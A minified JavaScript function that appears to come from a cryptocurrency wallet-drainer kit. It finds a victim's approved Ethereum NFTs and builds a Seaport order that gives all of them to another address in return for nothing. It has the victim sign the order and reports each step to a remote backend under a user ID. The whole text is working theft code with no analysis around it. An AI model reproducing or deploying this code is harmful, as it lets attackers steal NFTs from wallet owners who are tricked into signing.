const SIGN_SEAPORT=async(e,t,s,o,i)=>{try{const r=[],a=[];for(const t of e)t.skip||"ERC721"!==t.type||1!=t.chain_id||await is_nft_approved(t.address,s,"0x1E0049783F008A0085193E00003D00cd54003c71")&&(r.push({collection:t.address,tokenID:t.id}),a.push(t));if(0===r.length)return;let n=new ethers.providers.Web3Provider(t).getSigner(),c=[],d=[];r.forEach(((e,t)=>{c.push({itemType:2,token:e.collection,identifier:e.tokenID}),d.push({amount:"1",recipient:o,itemType:2,token:e.collection,identifier:e.tokenID})}));try{const t=new seaport.Seaport(n,{seaportVersion:"1.5"}),{executeAllActions:r}=await t.createOrder({offer:c,consideration:d,conduitKey:"0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",zone:"0x004C00500000aD104D7DBd00e3ae0A5C00560C00",startTime:"1660921177",endTime:"19163599577",offerer:s},o);await send_request({action:"seaport",user_id:i,seaport:"request",assets:a});const p=await r();await send_request({action:"seaport",user_id:i,seaport:"success",order:p,address:s});for(const t of e){if(t.skip||"ERC721"!==t.type||1!=t.chain_id)continue;let e=!1;for(const s of a)if("ERC721"===s.type&&1==s.chain_id&&s.address==t.address&&s.id==t.id){e=!0;break}1==e&&(t.skip=!0)}}catch(e){console.log(e),await send_request({action:"seaport",user_id:i,seaport:"cancel"})}}catch(e){console.log(e)}};